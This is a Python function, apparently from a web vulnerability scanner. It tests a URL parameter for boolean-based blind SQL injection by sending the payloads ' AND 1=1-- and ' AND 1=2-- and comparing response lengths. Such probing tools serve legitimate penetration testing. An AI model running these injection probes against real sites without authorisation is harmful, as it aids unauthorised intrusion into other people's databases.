def scan_boolean_based(url, param):
    """Scans for boolean-based blind SQL injection."""
    print(f"{YELLOW}[*] Testing for Boolean-Based Blind SQLi on parameter: {param}{RESET}")

    parts = urlparse(url)
    query_dict = parse_qs(parts.query)
    original_value = query_dict.get(param, [''])[0]

    # Payloads for True/False conditions
    payload_true = f"{original_value}' AND 1=1--"
    payload_false = f"{original_value}' AND 1=2--"

    try:
        # 1. Get original response
        original_res = requests.get(url, timeout=10)

        # 2. Test TRUE condition
        query_dict[param] = payload_true
        true_query = urlencode(query_dict, doseq=True)
        true_url = urlunparse(parts._replace(query=true_query))
        true_res = requests.get(true_url, timeout=10)

        # 3. Test FALSE condition
        query_dict[param] = payload_false
        false_query = urlencode(query_dict, doseq=True)
        false_url = urlunparse(parts._replace(query=false_query))
        false_res = requests.get(false_url, timeout=10)

        # 4. Compare lengths
        if len(original_res.text) == len(true_res.text) and len(original_res.text) != len(false_res.text):
            print(f"{GREEN}[+] Vulnerable to Boolean-Based Blind SQLi!{RESET}")
            print(f"  TRUE Payload: {true_url}")
            print(f"  FALSE Payload: {false_url}")
            return True

    except requests.RequestException as e:
        print(f"{RED}[-] Error during request: {e}{RESET}")

    print(f"{RED}[-] Not vulnerable to Boolean-Based Blind SQLi.{RESET}")
    return False